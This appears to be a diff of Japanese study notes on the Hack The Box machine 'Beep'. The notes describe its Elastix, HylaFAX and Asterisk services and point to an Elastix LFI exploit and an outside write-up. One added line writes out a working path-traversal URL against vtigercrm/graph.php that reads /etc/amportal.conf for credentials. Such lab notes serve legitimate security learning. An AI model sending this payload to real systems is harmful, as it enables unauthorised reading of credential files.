@@ -90,6 +90,10 @@ Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: U
 　>Elastixは、AsteriskベースのPBXに使いやすいインターフェースを付加するためにベストなツール群を統合化したアプライアンスソフトウェアです。また、オープンソースのテレフォニーのためのベストなソフトウェアパッケージとするために、独自のユーティリティの設定も追加されています。
 　引用元：https://ja.osdn.net/projects/sfnet_elastix/
   
+  --->LFIの脆弱性情報あり
+  
+  参考：php/webapps/37637.pl
+  
   Webmin：
   >WebminはWebベースのUnix用システム管理ツールです
   引用元：https://www.lac.co.jp/lacwatch/alert/20050920_000090.html
@@ -148,9 +152,27 @@ Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: U
 4559/tcp  open  hylafax    HylaFAX 4.3.10
 ```
 
+＞HylaFAX はファクシミリを送受信したり英数字のページを送信するためのエンタープライズクラスのシステムです。
+参考：https://wiki.archlinux.jp/index.php/Hylafax
+
 ```
 5038/tcp  open  asterisk   Asterisk Call Manager 1.1
 ```
+
+＞Asterisk(アスタリスク)は、オープンソースのIP-PBXソフトウェアです
+参考：https://www.ossnews.jp/oss_info/asterisk
+
+
+
+-------------------------------------------------
+一部WriteUpを確認-------------------------https://qiita.com/wacker22/items/21d68f183641ca35186f
+
+LFIにてconfigデータを取得
+view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+???なぜこのファイルを取得したか
+
+クレデンシャル情報は以下
+
 
 
 
